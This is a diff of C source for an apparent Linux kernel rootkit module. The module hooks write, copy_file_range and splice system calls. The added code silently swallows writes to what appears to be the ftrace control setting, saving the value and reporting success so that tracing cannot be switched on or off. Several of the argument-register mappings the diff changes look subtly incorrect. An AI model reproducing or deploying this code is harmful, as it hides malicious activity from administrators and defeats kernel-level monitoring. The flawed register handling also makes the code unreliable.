@@ -4,6 +4,12 @@
 
 #define BUF_SIZE 4096
 
+char saved_ftrace_value[16] = "1\n";
+EXPORT_SYMBOL(saved_ftrace_value);
+
+bool ftrace_write_intercepted = false;
+EXPORT_SYMBOL(ftrace_write_intercepted);
+
 static asmlinkage ssize_t (*original_write)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_write32)(const struct pt_regs *);
 static asmlinkage ssize_t (*original_writev)(const struct pt_regs *);
@@ -70,6 +76,12 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
             kfree(kernel_buf);
             return -EFAULT;
         }
+        
+        size_t len = min(count, (size_t)(sizeof(saved_ftrace_value) - 1));
+        memcpy(saved_ftrace_value, kernel_buf, len);
+        saved_ftrace_value[len] = '\0';
+        ftrace_write_intercepted = true;
+        
         kfree(kernel_buf);
 
         return count;
@@ -235,12 +247,12 @@ static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_
 
     if (!compat32) {
         fd_in  = regs->di;
-        fd_out = regs->r8;
-        count  = regs->r10;
+        fd_out = regs->r10;
+        count  = regs->r8;
     } else {
         fd_in  = regs->bx;
-        fd_out = regs->di;
-        count  = regs->si;
+        fd_out = regs->si;
+        count  = regs->r8;
     }
 
     struct file *out_file = fget(fd_out);
@@ -282,11 +294,11 @@ static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *reg
     if (!compat32) {
         fd_in  = regs->di;
         fd_out = regs->dx;
-        count  = regs->r8;
+        count  = regs->r10;
     } else {
         fd_in  = regs->bx;
         fd_out = regs->dx;
-        count  = regs->di;
+        count  = regs->si;
     }
 
     struct file *out_file = fget(fd_out);
